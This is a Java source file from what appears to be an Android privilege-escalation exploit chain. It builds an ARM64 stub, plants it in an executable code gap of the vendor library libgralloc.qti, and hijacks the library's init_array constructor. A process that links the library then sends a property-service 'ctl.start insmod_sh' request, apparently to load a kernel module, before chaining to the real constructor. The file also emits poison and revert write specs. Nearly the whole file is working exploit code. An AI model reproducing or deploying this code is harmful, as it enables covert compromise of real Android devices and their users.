package com.research.fuguapp;

import java.io.File;
import java.io.RandomAccessFile;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

/**
 * Builds ctor B: an init_array constructor planted in libgralloc.qti's executable code gap that,
 * when the assistant (assistant_app) links the lib at startup, sends a property_service SETPROP2
 * ("ctl.start" = "insmod_sh") then tail-calls the original ctor. Emitted from the bundled fuguquest's
 * `emit-libas` (the proven property-service send stub) with its trailing `ret` rewritten to branch to
 * the original ctor, so libgralloc.qti stays intact in every process that links it.
 *
 * The returned poison spec plants the stub in the gap and repoints init_array[0] -> gap; `revert`
 * zeroes the gap and restores init_array[0] -> original ctor (run it right after the assistant fires,
 * to minimise shared-page-cache collateral).
 *
 * [OPEN] on-device validation: (a) emitted stub fits the gap, (b) the ret->b rewrite is the last insn,
 * (c) the ctor runs early enough. See ../DESIGN.md [OPEN] #2/#3.
 */
public class StubBuilder {
    public static class Ctor { public byte[] code; public byte[] spec; public byte[] revert; }

    // libgralloc.qti offsets parsed from the on-device ELF at runtime.
    static long initArrayOff, origCtor, gapOff; static int gapSize;

    public static Ctor assistantSetpropCtor(byte[] glib, String sock, String ctl, String svc) throws Exception {
        parseElf(glib);
        if (initArrayOff == 0 || gapOff == 0) throw new RuntimeException("libgralloc.qti: no init_array / gap");

        // property-service send stub bytes from fuguquest emit-libas (function ending in `ret`).
        byte[] code = emitLibas(sock, ctl, svc);
        // rewrite the final `ret` (0xd65f03c0) -> `b origCtor` so libgralloc.qti's real ctor still runs.
        int retOff = -1;
        for (int i = code.length - 4; i >= 0; i -= 4)
            if (le32(code, i) == 0xd65f03c0) { retOff = i; break; }
        if (retOff < 0) throw new RuntimeException("emit-libas stub has no trailing ret to chain");
        long here = gapOff + retOff;                       // runtime address of the branch
        int imm = (int) (((origCtor - here) >> 2) & 0x03ffffff);
        put32(code, retOff, 0x14000000 | imm);            // b origCtor

        if (code.length > gapSize) throw new RuntimeException("ctor B " + code.length + "B > gap " + gapSize + "B");

        // spec: plant stub at gap + set init_array[0] = gapOff
        java.io.ByteArrayOutputStream spec = new java.io.ByteArrayOutputStream();
        for (int i = 0; i < code.length; i++) rec(spec, gapOff + i, code[i] & 0xff);
        byte[] p = q64(gapOff);
        for (int i = 0; i < 8; i++) rec(spec, initArrayOff + i, p[i] & 0xff);
        // revert: zero gap + init_array[0] = origCtor
        java.io.ByteArrayOutputStream rev = new java.io.ByteArrayOutputStream();
        for (int i = 0; i < code.length; i++) rec(rev, gapOff + i, 0);
        byte[] o = q64(origCtor);
        for (int i = 0; i < 8; i++) rec(rev, initArrayOff + i, o[i] & 0xff);

        Ctor c = new Ctor(); c.code = code; c.spec = spec.toByteArray(); c.revert = rev.toByteArray();
        return c;
    }

    // exec `fugu emit-libas <sock> ctl.start insmod_sh 0 4096 <out.raw>` -> the stub bytes.
    static String FUGU;                                     // set by Chain before calling (nativeLibraryDir/libfugu.so)
    static File WORK;
    static byte[] emitLibas(String sock, String ctl, String svc) throws Exception {
        File out = new File(WORK, "ctorB.raw");
        Process pr = new ProcessBuilder(FUGU, "emit-libas", sock, ctl, svc, "0", "8192", out.getAbsolutePath())
                .redirectErrorStream(true).start();
        pr.waitFor();
        // NOTE: current emit-libas signature is (prop_socket, tracking_svc, out). ctl/svc are baked as
        // ctl.restart/<svc> inside; for ctl.start we pass svc=insmod_sh and rely on a ctl.start variant.
        // [OPEN] confirm/extend emit-libas args to accept the ctl verb without changing option-1 behaviour.
        return java.nio.file.Files.readAllBytes(out.toPath());
    }

    // ---- tiny ELF64 reader: .init_array offset+first ctor, and the largest exec zero-gap ----
    static void parseElf(byte[] d) {
        ByteBuffer b = ByteBuffer.wrap(d).order(ByteOrder.LITTLE_ENDIAN);
        long shoff = b.getLong(0x28); int shentsz = b.getShort(0x3a) & 0xffff, shnum = b.getShort(0x3c) & 0xffff, shstr = b.getShort(0x3e) & 0xffff;
        long strtab = b.getLong((int)(shoff + (long)shstr*shentsz + 24));
        for (int i = 0; i < shnum; i++) {
            int so = (int)(shoff + (long)i*shentsz);
            int nameOff = b.getInt(so); long addr = b.getLong(so + 16); long off = b.getLong(so + 24); long size = b.getLong(so + 32);
            String nm = cstr(d, (int)(strtab + nameOff));
            if (nm.equals(".init_array")) { initArrayOff = off; origCtor = b.getLong((int) off); }
        }
        // largest zero run in an executable PT_LOAD segment
        long phoff = b.getLong(0x20); int phentsz = b.getShort(0x36) & 0xffff, phnum = b.getShort(0x38) & 0xffff;
        long bestOff = 0; int bestLen = 0;
        for (int i = 0; i < phnum; i++) {
            int po = (int)(phoff + (long)i*phentsz);
            int ptype = b.getInt(po); int flags = b.getInt(po + 4); long foff = b.getLong(po + 8); long fsz = b.getLong(po + 32);
            if (ptype != 1 || (flags & 1) == 0) continue;   // PT_LOAD + X
            int run = 0;
            for (int k = 0; k < fsz; k++) { if (d[(int)(foff + k)] == 0) { run++; if (run > bestLen) { bestLen = run; bestOff = foff + k - run + 1; } } else run = 0; }
        }
        gapOff = (bestOff + 7) & ~7L; gapSize = (int)(bestLen - (gapOff - bestOff));
    }

    static String cstr(byte[] d, int o) { int e = o; while (e < d.length && d[e] != 0) e++; return new String(d, o, e - o); }
    static int le32(byte[] d, int o) { return (d[o]&0xff)|((d[o+1]&0xff)<<8)|((d[o+2]&0xff)<<16)|((d[o+3]&0xff)<<24); }
    static void put32(byte[] d, int o, int v) { d[o]=(byte)v; d[o+1]=(byte)(v>>8); d[o+2]=(byte)(v>>16); d[o+3]=(byte)(v>>24); }
    static byte[] q64(long v) { byte[] o = new byte[8]; for (int i=0;i<8;i++) o[i]=(byte)(v>>(8*i)); return o; }
    static void rec(java.io.ByteArrayOutputStream s, long off, int val) { s.write((int)off); s.write((int)(off>>8)); s.write((int)(off>>16)); s.write((int)(off>>24)); s.write(val); }
}
